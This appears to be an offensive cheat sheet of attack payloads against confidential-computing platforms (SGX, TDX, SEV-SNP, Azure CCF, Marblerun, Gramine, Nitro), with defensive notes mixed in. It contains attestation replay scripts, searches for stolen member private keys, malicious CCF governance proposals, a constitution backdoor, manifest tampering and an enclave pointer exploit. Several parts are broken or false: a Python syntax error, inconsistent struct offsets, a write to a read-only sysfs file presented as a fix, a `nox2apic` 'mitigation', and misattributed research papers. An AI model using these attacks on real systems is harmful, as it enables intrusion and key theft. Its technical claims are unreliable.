# Confidential Computing Attack — Payloads

> Attack payloads and commands organized by TEE: Intel SGX (Foreshadow/SGAxe/LVI/ÆPIC Leak), Intel TDX, AMD SEV-SNP (CrossLine/BadRAM), Azure CCF, Marblerun, Gramine/Occlum.
>
> Replace `REPLACE_WITH_YOUR_X` placeholders with your own authorized engagement values. Side-channel attacks require careful scope confirmation. Never run these against systems you do not own or do not have written authorization to test.

## Table of Contents

1. [Reconnaissance — TEE Discovery](#1-reconnaissance--tee-discovery)
2. [SGX Binary Static Analysis](#2-sgx-binary-static-analysis)
3. [SGX Attestation — Quote Capture](#3-sgx-attestation--quote-capture)
4. [SGX Attestation — Replay Attack](#4-sgx-attestation--replay-attack)
5. [SGX Attestation — Advisory Bypass](#5-sgx-attestation--advisory-bypass)
6. [SGX SGAxe — EPID Key Extraction](#6-sgx-sgaxe--epid-key-extraction)
7. [SGX Foreshadow — L1TF Read](#7-sgx-foreshadow--l1tf-read)
8. [SGX LVI — Load Value Injection](#8-sgx-lvi--load-value-injection)
9. [SGX ÆPIC Leak — APIC MMIO Read](#9-sgx-apic-leak--apic-mmio-read)
10. [SGX-Step Single-Step Side Channel](#10-sgx-step-single-step-side-channel)
11. [SGX Sealed Secret Recovery](#11-sgx-sealed-secret-recovery)
12. [SGX ABI Misuse — Untrusted Pointer](#12-sgx-abi-misuse--untrusted-pointer)
13. [SGX ABI Misuse — AEX Race](#13-sgx-abi-misuse--aex-race)
14. [Intel TDX — TDREPORT Tampering](#14-intel-tdx--tdreport-tampering)
15. [Intel TDX — Quote Validation Bypass](#15-intel-tdx--quote-validation-bypass)
16. [AMD SEV — Discovery & Provisioning](#16-amd-sev--discovery--provisioning)
17. [AMD SEV-SNP — Attestation Parsing](#17-amd-sev-snp--attestation-parsing)
18. [AMD SEV-SNP — CrossLine Attack](#18-amd-sev-snp--crossline-attack)
19. [AMD SEV-SNP — BadRAM Attack](#19-amd-sev-snp--badram-attack)
20. [Azure CCF — Discovery & Governance](#20-azure-ccf--discovery--governance)
21. [Azure CCF — Consortium Membership Abuse](#21-azure-ccf--consortium-membership-abuse)
22. [Azure CCF — Constitution Amendment](#22-azure-ccf--constitution-amendment)
23. [Marblerun — Manifest Tampering](#23-marblerun--manifest-tampering)
24. [Gramine LibOS — Recon & Fuzzing](#24-gramine-libos--recon--fuzzing)
25. [Gramine LibOS — Syscall Emulation Escape](#25-gramine-libos--syscall-emulation-escape)
26. [Occlum LibOS — Bug Pattern](#26-occlum-libos--bug-pattern)
27. [AWS Nitro Enclaves — Discovery](#27-aws-nitro-enclaves--discovery)
28. [AWS Nitro Enclaves — Attestation Document Abuse](#28-aws-nitro-enclaves--attestation-document-abuse)
29. [Confidential Containers — Kata + SGX](#29-confidential-containers--kata--sgx)
30. [Detection Evasion — Constant-Time Mimicry](#30-detection-evasion--constant-time-mimicry)
31. [Persistence Patterns](#31-persistence-patterns)

---

## 1. Reconnaissance — TEE Discovery

### Detect SGX Usage in a Binary

```bash
# Look for SGX instructions
objdump -d target_binary | grep -E "(enclu|encls|enclv)"
# Common patterns:
#   enclu  # user-mode SGX (EENTER, EEXIT, ERESUME, EGETKEY, EREPORT)
#   encls  # supervisor-mode (ECREATE, EADD, EINIT, ...)
#   enclv  # virtualization (ECREATE from VMM)

# Look for SGX SDK symbols
nm -D target.so | grep -i sgx | head -20

# Look for SGX runtime patterns
strings target.so | grep -iE "(sgx_|enclave|MRENCLAVE|MRSIGNER)"
```

### Detect SEV-SNP / TDX Usage in Cloud

```bash
# dmesg reveals TEE info
dmesg | grep -iE "(sev|tdx|snp|sgx|cc)"

# CPUID reveals TEE support
cpuid | grep -iE "(SEV|TDX|SGX)"

# Detect specific platform
cat /proc/cpuinfo | grep -i flags | grep -oE "(sgx|sev|tdx|mpx)" | sort -u

# In confidential VM:
ls -la /dev/ | grep -iE "(sgx|sev|tdx|isgc)"
```

### Detect Confidential Computing on Azure / AWS / GCP

```bash
# Azure DC-series VMs
curl -s -H Metadata:true "http://169.254.169.254/metadata/instance?api-version=2023-07-01" \
  | jq '.compute.vmSize'
# Returns "Standard_DC4s_v3" for SGX, "Standard_EC4s_v5" for TDX, etc.

# AWS Nitro Enclaves detection
ls /dev/nitro_enclaves/ 2>/dev/null
# If exists → Nitro Enclaves is enabled

# GCP Confidential Space
curl -s -H Metadata:true \
  "http://metadata.google.internal/computeMetadata/v1/instance/confidential-instance-config"
```

### Identify Attestation Provider

```bash
# Intel IAS endpoint (legacy EPID)
grep -rE "as ske.*\.trustedexecution" /etc /opt /var/log 2>/dev/null

# Intel DCAP (modern ECDSA)
grep -rE "trus.*\.trustedexecution.*network" /etc /opt 2>/dev/null

# Azure Attestation
grep -rE "attest.azure.net" /etc /opt 2>/dev/null

# Custom attestation service
grep -rE "attest.*\..*" /etc /opt /var/log 2>/dev/null
```

---

## 2. SGX Binary Static Analysis

### Extract SGX Metadata

```bash
# Intel provides sgx_sign for metadata dumping
sgx_sign dump \
  -key REPLACE_WITH_YOUR_SIGNING_KEY \
  -enclave target.so \
  -dumpfile metadata.txt

# Metadata includes:
# - MRENCLAVE (enclave measurement)
# - MRSIGNER (signing key hash)
# - ISVPRODID, ISVSVM (version)
# - Release / Debug flag
# - Misc_Select, Attributes

cat metadata.txt | head -100
```

### Identify ECALLs and OCALLs

```bash
# Use sgx_edger8r output to find edge routines
nm target.so | grep -E "(ecall|ocall)" | head -20

# Inspect EDL file (if available)
cat Enclave.edl | head -50
# enclave { trusted { public void eclass_encrypt([in] uint8_t *ptext, ...); } }
```

### Detect Untrusted Pointer Usage

```bash
# In EDL, look for parameters without [in], [out], [in, out] qualifiers
# These are pointers passed from untrusted to trusted without copy
grep -E "(\\[user_check\\]|pointer.*trusted)" Enclave.edl

# In disassembly, look for direct dereference of incoming pointer
objdump -d target.so | awk '/ecall_/{flag=1} flag {print} /^$/{flag=0}' | head -100
```

---

## 3. SGX Attestation — Quote Capture

### Capture an Attestation Quote

```c
// In an SGX SDK application
#include "sgx_report.h"
#include "sgx_quote.h"

sgx_target_info_t target_info = {0};
sgx_epid_group_id_t gid = {0};
sgx_report_t report = {0};
sgx_quote_sign_type_t linkable = SGX_LINKABLE_SIGNATURE;
sgx_quote_t quote[8192] = {0};
uint32_t quote_len = sizeof(quote);

// Step 1: Get target info from QE
sgx_init_quote(&target_info, &gid);

// Step 2: Generate report from enclave
sgx_create_report(&target_info, NULL, &report);

// Step 3: Get quote from QE (via DCAP library)
sgx_get_quote(&report, linkable, NULL, NULL, quote, &quote_len, NULL);
```

### Parse Quote Format

```python
# Quote structure:
# - sgx_quote_t header (96 bytes): version, sign_type, epid_group_id, qe_svn, pce_svn, basename
# - body: sgx_report_body_t (384 bytes): cpusvn, mrenclave, mrsigner, isvprodid, isvsvn, report_data, ...
# - signature: EPID signature (variable) OR ECDSA (depending on version)

import struct

with open('quote.bin', 'rb') as f:
    data = f.read()

# Parse header (96 bytes)
version, sign_type = struct.unpack_from('<HI', data, 0)
epid_group_id = data[8:16]
qe_svn, pce_svn = struct.unpack_from('<HH', data, 16)
basename = data[20:36)

# Parse body (next 384 bytes)
body = data[48:48+384]
mrenclave = body[16:48+16]
mrsigner = body[48+16:48+16+32]
isvprodid, isvsvn = struct.unpack_from('<HH', body, 48+32+256+8+12+32+32+32+32+32+8)
report_data = body[48+32+256+8+12+32+32+32+32+32+8+4:48+32+256+8+12+32+32+32+32+32+8+4+64]

print(f"MRENCLAVE: {mrenclave.hex()}")
print(f"MRSIGNER: {mrsigner.hex()}")
print(f"ISVPRODID: {isvprodid}, ISVSVN: {isvsvn}")
print(f"Report Data (nonce): {report_data.hex()}")
```

---

## 4. SGX Attestation — Replay Attack

### Capture and Replay

```python
# Step 1: Capture a valid quote (via MITM proxy on attestation flow)
import requests

# Interpose between client and verifier
def capture_quote(quote_bytes, nonce, timestamp):
    with open(f"quote_{timestamp}.bin", 'wb') as f:
        f.write(quote_bytes)

# Step 2: Replay later
def replay_quote(verifier_url, stale_quote_path, original_nonce):
    with open(stale_quote_path, 'rb') as f:
        quote = f.read()

    # If verifier doesn't check nonce freshness
    r = requests.post(verifier_url, data={
        'quote': quote.hex(),
        'nonce': original_nonce,  # ← stale nonce
    })
    return r.status_code == 200
```

### Defense: Verifier MUST Check Nonce

```python
# Verifier-side defense
def verify_attestation(quote_hex, client_nonce, server_nonce_sent):
    if client_nonce != server_nonce_sent:
        return False  # reject stale

    if server_nonce_sent not in PENDING_NONCES:
        return False  # already consumed

    PENDING_NONCES.remove(server_nonce_sent)  # consume
    return verify_quote_signature(quote_hex)
```

---

## 5. SGX Attestation — Advisory Bypass

### Intel Advisory (Allow-List) Bypass

```python
# Intel IAS returns advisory IDs for vulnerable enclave versions
# Verifier policy determines which advisories to allow
# If policy allows vulnerable advisories → unpatched enclaves still attest

# Verifier config example (VULNERABLE TO ATTACK)
ADVISORY_ALLOWLIST = [
    "INTEL-SA-00219",  # Foreshadow
    "INTEL-SA-00320",  # SGAxe (CVE-2020-0549)
    # ... etc
]

# Attack: target vulnerable enclave, verifier allows it
```

### Hardening: Strict Advisory Policy

```python
# Verifier-side hardening
def verify_attestation(quote, policy):
    # Get advisory IDs from IAS/DCAP
    advisories = call_ias(quote)

    # Reject if ANY vulnerable advisory is present
    for adv in advisories:
        if adv in BLOCKED_ADVISORIES:
            return False

    # Reject if version below minimum
    if quote.body.isvsvn < policy.min_isvsvn:
        return False

    return True
```

---

## 6. SGX SGAxe — EPID Key Extraction

### Attack Overview

SGAxe (CVE-2020-0549) extracts the platform's EPID group key. Once extracted, an attacker can forge attestation quotes for any enclave running on that platform.

```c
// SGAxe is a sophisticated cache attack — runs in user-mode on SGX-enabled platform
// Uses L1D cache eviction patterns to leak EPID key from Quoting Enclave

// PoC structure:
// 1. Trigger QE execution of EPID signing
// 2. Use cache side-channel to leak EPID private key
// 3. Forge attestation quotes with extracted key

// Reference PoC (academic, NOT reproducible here):
// https://cacheoutattack.com/
```

### Detect SGAxe Vulnerability

```bash
# Check Intel microcode version
dmesg | grep microcode
# Intel platforms with microcode < 2020-02-XX are vulnerable

# Check kernel SGX support
cat /proc/cpuinfo | grep sgx
# Pre-2020 SGX platforms are vulnerable
```

### Defense

```bash
# Apply Intel microcode update
sudo apt install intel-microcode
sudo reboot

# Verify SGX advisory status
sudo sgx-ra-attestation --verify-platform-status
```

---

## 7. SGX Foreshadow — L1TF Read

### Attack Overview

Foreshadow (CVE-2018-3615) exploits L1 Terminal Fault to read SGX enclave memory from outside the enclave.

```c
// Foreshadow PoC structure (academic — simplified)
// 1. Identify target enclave page address
// 2. Set PTE present bit to 0 (cause page fault → L1TF)
// 3. L1 cache contains data from previous access
// 4. Read L1 via transient execution

// Reference: https://foreshadowattack.eu/
```

### Detect L1TF Vulnerability

```bash
# Check kernel L1TF mitigation
cat /sys/devices/system/cpu/vulnerabilities/l1tf
# "Mitigation: PTE Inversion" → mitigated
# "Vulnerable" → at risk

# Check CPU model
cat /proc/cpuinfo | grep -E "model name" | head -1
# Pre-Coffee Lake (2018) Intel CPUs are vulnerable
```

### Defense

```bash
# Apply kernel L1TF mitigation
echo 1 | sudo tee /sys/devices/system/cpu/vulnerabilities/l1tf
# Or update kernel
sudo apt update && sudo apt install linux-image-generic
```

---

## 8. SGX LVI — Load Value Injection

### Attack Overview

LVI (CVE-2020-0551) injects faulting load operations into enclave execution to hijack control flow.

```c
// LVI attack structure:
// 1. Configure PTE to fault on a specific memory load
// 2. Trigger enclave execution that loads from faulting address
// 3. Microcode reads invalid value from L1D (stale data)
// 4. Enclave uses attacker-controlled data

// Reference: https://lviattack.eu/
```

### Detect LVI Vulnerability

```bash
cat /sys/devices/system/cpu/vulnerabilities/mds
# "Vulnerable" → at risk for LVI

# Check microcode version
sudo iucode_tool --list
```

### Defense

```bash
# Apply microcode update
sudo apt install intel-microcode
sudo reboot
```

---

## 9. SGX ÆPIC Leak — APIC MMIO Read

### Attack Overview

ÆPIC Leak (CVE-2022-21233) exploits a bug in x86 APIC MMIO read to leak SGX enclave data. The bug is in the CPU's APIC, not in SGX directly, but it leaks SGX memory contents.

```c
// ÆPIC Leak structure:
// 1. Read from APIC MMIO region (0xFEE00000 - 0xFEE01000)
// 2. Some reads return stale SGX enclave data from internal buffer
// 3. Repeat for various offsets to reconstruct enclave memory

// Reference: https://aepicleak.com/
```

### Detect ÆPIC Leak Vulnerability

```bash
# Check CPU model
cat /proc/cpuinfo | grep "model name"
# Affected: Intel Xeon SP (Ice Lake), 3rd Gen Intel Xeon Scalable

# Verify via /proc/cpuinfo
cat /proc/cpuinfo | grep -i "sgx"
```

### Defense

```bash
# Disable APIC MMIO via kernel parameter
sudo grubby --update-kernel=ALL --args="nox2apic"

# Update microcode
sudo apt install intel-microcode
```

---

## 10. SGX-Step Single-Step Side Channel

### Overview

SGX-Step (academic project) enables single-stepping of SGX enclave execution by manipulating APIC timer.

```bash
# Install SGX-Step
git clone https://github.com/jovanbulck/sgx-step
cd sgx-step
make

# Run against target enclave
./app/sgx-step-target --single-step
# Output: trace of each instruction executed in enclave
```

### Side-Channel Analysis

```python
# Use single-step trace to identify secret-dependent branches
import re

trace = open('enclave_trace.txt').read()

# Look for variable loop counts (e.g., per-byte crypto operation)
pattern = re.compile(r'Iteration on byte (\d+): (\d+) instructions')
matches = pattern.findall(trace)

# If instruction count varies per byte → secret-dependent branch
for byte_pos, instr_count in matches:
    print(f"Byte {byte_pos}: {instr_count} instructions")
```

### Defense

- **Constant-time crypto** — use libsodium, OpenSSL CT builds
- **Page-fault side-channel defenses** — Occlum's memdb, Gramine's signature verification
- **Hardware mitigations** — newer SGX with AEX-notify

---

## 11. SGX Sealed Secret Recovery

### Sealed Secret Format

```c
// SGX sealed secrets use sgx_sealed_data_t structure
typedef struct {
  uint32_t key_request_count;
  uint32_t aes_data_size;
  uint8_t  encrypt_key[SGX_KEYSELECT_EINIT_KEY_SIZE];
  ...
  uint8_t  encrypted_data[];
} sgx_sealed_data_t;

// Seal key is derived from:
// - Key Name (0x0001 for MRENCLAVE, 0x0002 for MRSIGNER)
// - Key Policy
// - ISV SVN, CPU SVN
// - MASK_KEY
// - OWNERSHIP DOMAIN
```

### Extract Sealed Secrets from Disk

```bash
# Find sealed secret files
find / -name "*.sealed" 2>/dev/null
find / -name "*seal*" 2>/dev/null

# Hex dump for parsing
xxd sealed_secret.bin | head -20
```

### Derive Seal Key Offline

```python
# If you have:
# - Enclave binary (to extract MRENCLAVE)
# - CPU SVN from quote (or platform)
# - ISV SVN from quote (or manifest)

# Seal key derivation uses EGETKEY instruction
# Reference: Intel SGX SDK sgx_seal_data()

# From a compromised platform:
# 1. Run EGETKEY from within enclave
# 2. Or, run on the same platform that sealed the data

# In an authorized lab, you can use the Intel SDK to test seal/unseal:
# sgx_seal_data() to seal
# sgx_unseal_data() to unseal
```

---

## 12. SGX ABI Misuse — Untrusted Pointer

### Bug Pattern

```c
// Bug: ECALL takes a pointer but doesn't validate it
// EDL:
// trusted {
//   public void eclass_encrypt([in] uint8_t *ptext, [out] uint8_t *ctext);
// }
//
// If ptext is not marked [in], it's NOT copied into enclave memory
// → attacker passes pointer to enclave-protected memory, reads it after ECALL

// Vulnerable ECALL (in enclave code):
void ecall_encrypt(uint8_t *ptext, uint8_t *ctext) {
    // Direct use of ptext without sgx_is_within_enclave() check
    memcpy(internal_buf, ptext, SIZE);  // BUG
    encrypt_rsa(internal_buf, ctext);    // BUG: ctext also untrusted
}
```

### Exploit

```c
// Attacker from untrusted host:
uint8_t *attack_buf = mmap(enclave_secret_addr, 4096, PROT_READ, MAP_SHARED, ...);
ecall_encrypt(global_eid, attack_buf, attacker_output);
// attacker_output now contains encrypted enclave secret
```

### Defense

```c
// Validate all incoming pointers
void ecall_encrypt(uint8_t *ptext, uint8_t *ctext) {
    if (!sgx_is_within_enclave(ptext, SIZE) || !sgx_is_within_enclave(ctext, SIZE)) {
        return SGX_ERROR_INVALID_PARAMETER;
    }
    // Use checked_ptr pattern from SDK
}
```

---

## 13. SGX ABI Misuse — AEX Race

### Bug Pattern

```c
// AEX (Asynchronous Enclave Exit) races: enclave executes read-modify-write
// If AEX happens between read and write, host can change underlying memory

// Vulnerable pattern:
void ecall_update_counter(uint32_t *counter) {
    (*counter)++;
    // If AEX fires here, host can replace *counter with attacker value
    // Enclave continues with stale read
}
```

### Defense

- Disable interrupts during critical sections
- Use transactional memory (Intel TSX) for atomicity
- Re-validate state after every OCALL

---

## 14. Intel TDX — TDREPORT Tampering

### TDX Attestation Report Format

```c
// TDREPORT structure (1024 bytes):
typedef struct {
  uint8_t  td_uuid[16];
  uint8_t  td_attributes[8];
  uint8_t  xfam[8];
  uint8_t  mrtd_meas[48];      // TD measurement
  uint8_t  mrtd_signer[48];    // Signer measurement
  uint8_t  rt_mr0[48];
  uint8_t  rt_mr1[48];
  uint8_t  rt_mr2[48];
  uint8_t  rt_mr3[48];
  uint8_t  report_data[64];    // Nonce (user-supplied)
  ...
} td_report_t;

// Report is signed by TDX Module key
// Verifier checks signature against Intel's published TDX certificate
```

### Quote Validation Bypass Attempt

```python
# Common validation flaws in relying parties:
# 1. Don't verify report_data matches server-supplied nonce
# 2. Don't check td_attributes bit for DEBUG
# 3. Don't verify against latest Intel cert

# Defense: use Intel's veristack / sample verifier code
```

---

## 15. Intel TDX — Quote Validation Bypass

```python
# If relying party doesn't verify Intel root cert:
def td_verify_bypass(report, signature):
    # Insecure verifier:
    if signature.valid:  # ← never verify against Intel root
        return True
    return False

# Defense: pin Intel's published cert in verifier
def td_verify_hardened(report, signature):
    if not verify_chain(signature, intel_root_cert):
        return False
    if report.td_attributes & DEBUG_FLAG:
        return False  # reject debug-mode TDs
    if report.report_data != server_supplied_nonce:
        return False
    return True
```

---

## 16. AMD SEV — Discovery & Provisioning

### Detect SEV Support

```bash
# Check kernel SEV module
lsmod | grep -iE "(sev|ccp|amd)"

# Check device files
ls -la /dev/sev /dev/sev-guest

# Check libvirt / QEMU for SEV guest
virsh dumpxml guest_name | grep -i sev
qemu-system-x86_64 -accel kvm -machine ...,memory-encryption=sev0 ...
```

### Use sev-tool for Provisioning

```bash
# AMD SEV Tool
git clone https://github.com/AMDESE/sev-tool
cd sev-tool
make

# Generate platform keys
./sev-tool --generate_cert

# Get attestation report
./sev-tool --get_report --policy 0x1 --meas 0x...

# Verify report
./sev-tool --verify_report --platform_cert ./cert_chain.cert
```

---

## 17. AMD SEV-SNP — Attestation Parsing

### SEV-SNP Attestation Report

```c
// SEV-SNP report structure (0x1000 = 4096 bytes):
typedef struct {
  uint32_t version;
  uint32_t guest_svn;
  uint64_t policy;
  uint8_t  family_id[16];
  uint8_t  image_id[16];
  uint32_t vmpl;
  uint32_t signature_algo;
  uint8_t  platform_version[4];
  uint8_t  platform_info[8];
  uint32_t flags;
  uint32_t reserved;
  uint8_t  report_data[64];   // User-supplied nonce
  uint8_t  measurement[48];   // Guest measurement
  uint8_t  host_data[32];
  uint8_t  id_key_digest[48];
  uint8_t  author_key_digest[48];
  uint8_t  report_id[32];
  uint8_t  report_id_ma[32];
  uint8_t  reported_tcb[8];
  ...
} snp_report_t;
```

### Verify Attestation

```bash
# Get VCEK cert from AMD KDS (Key Distribution Service)
curl -s "https://kdsintf.amd.com/vcek/v1/Milan/<.hwid>?blSPL=<...>&teeSPL=<...>" \
  > vcek.pem

# Verify report signature
./sev-tool --verify_snp_report \
  --report report.bin \
  --vcek vcek.pem
```

---

## 18. AMD SEV-SNP — CrossLine Attack

### Attack Overview

CrossLine (USENIX Security 2025) demonstrates that SEV-SNP's VMPL (Virtual Machine Privilege Levels) can be misused to break VM-to-VM isolation within a single SEV-SNP platform.

```c
// CrossLine attack flow:
// 1. Attacker runs VM-A (malicious) on SEV-SNP platform
// 2. VM-B (victim) runs on same platform
// 3. Attacker exploits VMPL transitions to access VM-B's memory
// 4. Or, attacker spoofs VMPL to read VM-B's TCB state

// Reference: CrossLine paper, USENIX Security 2025
```

### Defense

- **Migration isolation** — never co-locate mutually-untrusted VMs
- **Hypervisor enforcement** — VMM must enforce VMPL boundaries
- **Cloud policy** — CSP must classify VMs into trust tiers and schedule accordingly

---

## 19. AMD SEV-SNP — BadRAM Attack

### Attack Overview

BadRAM (USENIX Security 2024) exploits DDR5 SPD (Serial Presence Detect) bypass on consumer DIMMs to break SEV-SNP's memory integrity.

```bash
# BadRAM attack steps:
# 1. Attacker has physical access to DRAM slots (in lab / for "evil maid" scenarios)
# 2. Modify SPD EEPROM on DIMM to report incorrect size
# 3. CPU maps DIMM as 32GB but actual memory is 16GB
# 4. Memory accesses above 16GB alias back to lower addresses
# 5. SEV-SNP's RMP (Reverse Map) doesn't catch this — integrity broken
```

### Defense

- **DDR5 with cryptographic SPD authentication** — modern DDR5 ECC DIMMs include signed SPD
- **Cloud provider physical security** — for IaaS, CSP must prevent DIMM tampering
- **SEV-SNP with RMP re-validation** — newer firmware validates memory map

---

## 20. Azure CCF — Discovery & Governance

### CCF Network Discovery

```bash
# CCF exposes /node/network and /node/constitution
curl -s https://ccf.target.example/node/network | jq
# Returns: service_status, current_service_certificate, previous_service_certificate

curl -s https://ccf.target.example/node/constitution | jq
# Returns: constitution (JS) and JS app code

curl -s https://ccf.target.example/node/commit | jq
# Returns: last commit, view, seqno
```

### List Consortium Members

```bash
curl -s https://ccf.target.example/gov/members | jq
# Returns: each member's cert, status (Active/Retired), member_data

# Identify who has signing authority
curl -s https://ccf.target.example/gov/proposals | jq
```

---

## 21. Azure CCF — Consortium Membership Abuse

### Capture Member Private Key

```bash
# Look for member private key in config files / env
find / -name "*member*priv*" 2>/dev/null
find / -name "*member*pem*" 2>/dev/null
grep -r "MEMBER_PRIV_KEY" /etc /opt 2>/dev/null

# Often stored in:
# /opt/ccf/member/privk.pem
# /etc/ccf/member/privk.pem
# Env var: CCF_MEMBER_PRIV_KEY
```

### Submit Malicious Proposal

```bash
# Once you have a member's private key, submit a proposal
ccf-cli proposal create \
  --url https://ccf.target.example \
  --member-key member_privk.pem \
  --member-cert member_cert.pem \
  --proposal allow_new_member \
  --param '{"cert":"<attacker_cert_pem>","member_data":{"role":"operator"}}'

# If quorum (e.g., 3 of 5 members) approves → attacker becomes operator
```

### Defense: Strict Quorum + Multisig

```javascript
// In CCF constitution:
export function vote(rawVote, proposalId) {
  const vote = parseVote(rawVote);

  // Require multi-sig for membership changes
  if (proposalId === "allow_new_member") {
    if (vote.member_count < REQUIRED_QUORUM) {
      return false;
    }
  }

  // Validate vote member has "operator" role
  if (!memberHasRole(vote.member, "operator")) {
    return false;
  }

  return true;
}
```

---

## 22. Azure CCF — Constitution Amendment

### Constitution Update Attack

```bash
# If you have quorum, you can change the constitution itself
ccf-cli proposal create \
  --url https://ccf.target.example \
  --member-key member_privk.pem \
  --proposal set_constitution \
  --param '{"constitution":"<attacker_constitution_js>"}'

# Attacker constitution could:
# - Disable vote validation
# - Allow self-granting of operator role
# - Backdoor all subsequent proposals
```

### Defense

- **Constitution hashing** — verify hash matches committed version
- **Audit trail** — log all constitution changes to external system
- **Off-chain review** — require code review of constitution changes

---

## 23. Marblerun — Manifest Tampering

### Marblerun Manifest Format

```yaml
# Marblerun EManifest (YAML, signed)
name: payment-app
version: "1.0.0"
hardware:
  cpuType: "Intel SGX"
  attestation:
    type: "DCAP"
marbles:
  payment-api:
    template: ...
    parameters:
      ArgLayers: ...
      Files:
        - source: "/app/config"
          target: "config"
    activation_token: "secret-token"
    namespace: "production"
users:
  admin:
    cert: "..."
    roles: ["admin"]
```

### Tamper Manifest at Rest

```bash
# If manifest is stored on disk without signature verification
find / -name "*.manifest" -o -name "emanifest*" 2>/dev/null

# Modify manifest to weaken attestation
sed -i 's/type: "DCAP"/type: "none"/' payment.manifest

# Re-sign with attacker key (if signature verification is weak)
marblerun-cli manifest sign --key attacker_privk.pem --manifest tampered.manifest
```

### Defense

- **Quote verification on manifest** — Marblerun verifies manifest signature matches MRENCLAVE in quote
- **Audit manifest changes** — store in CCF or external audit log
- **Pin manifest hash** — relying party should pin expected manifest hash

---

## 24. Gramine LibOS — Recon & Fuzzing

### Gramine Manifest Inspection

```bash
# Gramine manifest is TOML-like
gramine-sgx-sign --manifest app.manifest --output app.manifest.sgx

# Inspect manifest
cat app.manifest | head -50

# Key fields:
# - sgx.enclave_size  → memory size
# - sgx.trusted_files → files in enclave measurement
# - sgx.allowed_files → files outside measurement
# - loader.env_default_entry → entry point
```

### Trace Syscalls

```bash
# Run with syscall tracing
gramine-sgx --exit-with-parent=true \
  --syslog-level=debug \
  --log-file=gramine.log \
  target-app

# Review syscalls — emulated syscalls are marked
grep -i "syscall" gramine.log | head -50
```

### Fuzz Syscall Boundary

```bash
# Use AFL+Gramine for fuzzing
afl-fuzz -i input/ -o output/ -- \
  gramine-sgx-direct target-app @@
```

---

## 25. Gramine LibOS — Syscall Emulation Escape

### Bug Pattern

```c
// Gramine emulates syscalls inside the enclave
// If emulation has a bug, attacker can escape

// Example historical bug:
// - open() with O_CREAT on trusted file → host file created without manifest entry
// - mmap() with PROT_EXEC on untrusted file → code execution from host
// - ioctl() with arbitrary arg → libos confusion

// Attack:
// 1. Trigger vulnerable syscall from inside the enclave
// 2. Confuse libos to leak enclave memory or execute host code
```

### Recon for Bug Patterns

```bash
# Look for syscall dispatchers in libos
strings liblibos.so | grep -iE "syscall|dispatch"

# Inspect syscall table
objdump -d liblibos.so | grep -E "dispatch_syscall|handle_syscall"
```

---

## 26. Occlum LibOS — Bug Pattern

### Occlum Architecture

```bash
# Occlum uses Rust libos with SGX SDK
# Manifest is TOML-like
occlum build
occlum run /bin/app

# Inspect Occlum manifest
cat Occlum.json | jq
```

### Common Bug Patterns

- **FD exhaustion**: Occlum libos FD table is fixed-size
- **Path traversal**: relative paths not normalized
- **Race in dispatch table**: TOCTOU between table lookup and dispatch

---

## 27. AWS Nitro Enclaves — Discovery

### Nitro Enclaves Detection

```bash
# Inside a Nitro Enclave, kernel exposes /dev/nitro_enclaves/
ls /dev/nitro_enclaves/

# Attestation document via NSM (Nitro Secure Module) device
ls /dev/nsm/

# Query NSM for PCR (Platform Configuration Register) values
nsm-cmd --get-pcrs
```

### Attestation Document Format

```python
# Attestation document is COSE-Sign1
# Contains:
# - module_id: unique enclave identifier
# - digest: SHA-384
# - timestamp: validity window
# - pcrs: Platform Configuration Registers (PCRs 0-7)
# - certificate: AWS Nitro attestation cert chain
# - public_key: optional enclave public key

# Verifier-side:
import cbor2
from cose import Sign1Message

with open('attestation.cbor', 'rb') as f:
    cose_msg = Sign1Message.decode(f.read())
cose_msg.verify_signature(aws_root_cert)
payload = cbor2.loads(cose_msg.payload)
print(payload['pcrs'])  # {'0': b'...', '1': b'...', ...}
```

---

## 28. AWS Nitro Enclaves — Attestation Document Abuse

### Replay Attack

```python
# If verifier doesn't check timestamp and nonce
def insecure_verify(doc):
    if verify_signature(doc):
        return True
    return False

# Attacker replays stale document
attacker_doc = open('captured_attestation.cbor', 'rb').read()
r = requests.post(verifier_url, json={'attestation': attacker_doc.hex()})
```

### Hardened Verifier

```python
import time
from datetime import datetime, timezone

def secure_verify(doc, expected_pcrs, server_nonce):
    # Verify COSE signature
    if not verify_signature(doc):
        return False

    payload = parse_cose(doc)

    # Check PCR values
    for pcr_index, pcr_value in expected_pcrs.items():
        if payload['pcrs'][str(pcr_index)] != pcr_value:
            return False

    # Check timestamp (must be within 60 seconds)
    now = int(time.time())
    if not (now - 60 <= payload['timestamp'] <= now + 60):
        return False

    # Check nonce (must match server-supplied nonce)
    if payload['nonce'] != server_nonce:
        return False

    return True
```

---

## 29. Confidential Containers — Kata + SGX

### Architecture

```bash
# Confidential Containers (coco) combines Kata Containers + TEE
# Workflow:
# 1. Pod spec requests TEE runtime class
# 2. Kata launches VM with SGX/TDX/SEV-SNP
# 3. Container runs inside VM, with TEE protections

# Detect confidential container runtime
kubectl get runtimeclass
# NAME       HANDLER    AGE
# kata-qemu  kata-qemu  30d

# Pod spec with TEE
apiVersion: v1
kind: Pod
metadata:
  name: cc-pod
spec:
  runtimeClassName: kata-qemu
  containers:
    - name: app
      image: cc-app
      resources:
        limits:
          kubernetes.io/sgx: 1
```

### Attack Surface

- **Image signature bypass** — if image not signed, attacker substitutes malicious image
- **Runtime class abuse** — request TEE for malicious enclave
- **Hardware quota exhaustion** — DoS via TEE allocation

---

## 30. Detection Evasion — Constant-Time Mimicry

### Hide Side-Channel Variance

```python
# When side-channel monitoring is in place, attackers can mask variance
# by performing constant-time padding

# Naive attack (detectable):
def leak_byte(secret_byte):
    for i in range(secret_byte):
        pass  # variable loop count
    return

# Constant-time variant:
def leak_byte_constant_time(secret_byte):
    for i in range(256):
        if i < secret_byte:
            pass  # do work
        else:
            do_dummy_work()  # match timing
    return

# Defender's mitigation: monitor total CPU cycles, not just variance
```

---

## 31. Persistence Patterns

### SGX Persistence via Sealed Secrets

```c
// Attacker with enclave access can persist via sealed secrets
// Seal malware config to disk, decrypt on next run
sgx_seal_data(...);
// Sealed secret survives reboots and platform reset
```

### CCF Persistence via Constitution Backdoor

```javascript
// Constitution backdoor:
export function vote(rawVote) {
  if (rawVote.member === "ATTACKER_MEMBER") {
    return true;  // always accept attacker's vote
  }
  // ... normal vote logic
}
```

### Marblerun Persistence via Manifest Tampering

```yaml
# If manifest verification is weak, attacker can persist modified manifest
marbles:
  backdoor-helper:
    template: backdoor-template
    parameters:
      ArgLayers: ["backdoor"]
```

---

## Reference — TEE Comparison Cheatsheet

| Feature | Intel SGX | Intel TDX | AMD SEV-SNP | AWS Nitro | Azure CCF |
|---|---|---|---|---|---|
| Granularity | Enclave (process) | VM | VM | Process (in VM) | Multi-node network |
